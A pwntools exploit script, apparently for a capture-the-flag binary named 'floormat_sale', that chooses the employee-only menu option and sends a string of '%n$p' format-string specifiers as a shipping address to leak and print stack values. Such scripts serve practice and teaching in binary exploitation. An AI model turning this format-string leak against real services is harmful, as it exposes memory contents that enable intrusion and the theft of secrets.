from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b *employee_access
continue
'''

# Set up pwntools for the correct architecture
exe = './floormat_sale'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

leak_count = 29

# Start program
io = start()

# Choose the Employee-only mat (option 6) to trigger the correct flow
io.sendlineafter(b'Enter your choice:', b'6')

# Wait for the prompt to enter the shipping address
io.recvuntil(b'Please enter your shipping address:')

# Generate a payload that will leak multiple stack values at once (up to 30)
payload = b" ".join([f"%{i}$p".encode()
                    for i in range(1, leak_count)])
io.sendline(payload)

# Receive the text, so that we don't mess up position of leaked values
io.recvlines(2)

# Receive and print the response to analyze the leaked values
# Decode with 'replace' to avoid crashing on non-ASCII bytes
response = io.recvall().decode(errors="replace")

# Split the response to process each value separately
leaked_values = response.split()

# Print each value with its index for easier analysis
for i in range(leak_count):
    print(f"Leaked value at %<{i}$p>: {leaked_values[i]}")

# Close the process after testing
io.close()
